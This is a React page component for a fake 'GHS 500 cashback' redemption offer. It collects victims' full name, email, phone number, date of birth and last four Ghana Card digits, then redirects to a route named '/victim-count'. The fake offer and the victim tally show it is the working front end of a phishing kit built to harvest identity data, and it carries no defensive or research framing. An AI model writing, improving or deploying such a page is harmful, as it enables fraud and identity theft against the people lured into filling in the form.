import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { submitForm } from '../services/api';
import Loader from '../components/Loader';
import './HomePage.css';

const HomePage = () => {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    dateOfBirth: '',
    lastFourDigits: ''
  });
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const form = new FormData();
      Object.entries(formData).forEach(([key, value]) => {
        form.append(key, value);
      });

      const data = await submitForm(form);
      
      if (!data || !data.success) {
        console.error('Submission failed', data);
        setLoading(false);
        alert('Submission failed. Please try again.');
        return;
      }

      // Navigate to victim count page
      setTimeout(() => {
        navigate('/victim-count');
      }, 500);
    } catch (err) {
      console.error(err);
      setLoading(false);
      alert('An error occurred. Please try again.');
    }
  };

  return (
    <>
      <section id="page1" className="page active">
        <div className="card">
          <h1>REDEEM YOUR GHS 500 CASHBACK HERE</h1>
          <p>Please enter your details below to continue.</p>

          <form id="userForm" onSubmit={handleSubmit}>
            <input 
              type="text" 
              id="name" 
              name="name" 
              placeholder="Full Name" 
              value={formData.name}
              onChange={handleChange}
              required 
            />
            <input 
              type="email" 
              id="email" 
              name="email" 
              placeholder="Email Address" 
              value={formData.email}
              onChange={handleChange}
              required 
            />
            <input 
              type="tel" 
              id="phone" 
              name="phone" 
              placeholder="Phone Number" 
              value={formData.phone}
              onChange={handleChange}
              required 
            />
            <div className="date-group">
              <input 
                type="date" 
                id="dateOfBirth" 
                name="dateOfBirth" 
                value={formData.dateOfBirth}
                onChange={handleChange}
                required 
              />
              <span className="date-placeholder">Date of Birth</span>
            </div>
            <input 
              type="text" 
              id="lastFourDigits" 
              name="lastFourDigits" 
              placeholder="Last 4 digits of your Ghana Card Number" 
              value={formData.lastFourDigits}
              onChange={handleChange}
              required 
            />

            <button type="submit">SUBMIT</button>
          </form>
        </div>
      </section>

      <Loader show={loading} text="Processing..." />
    </>
  );
};

export default HomePage;
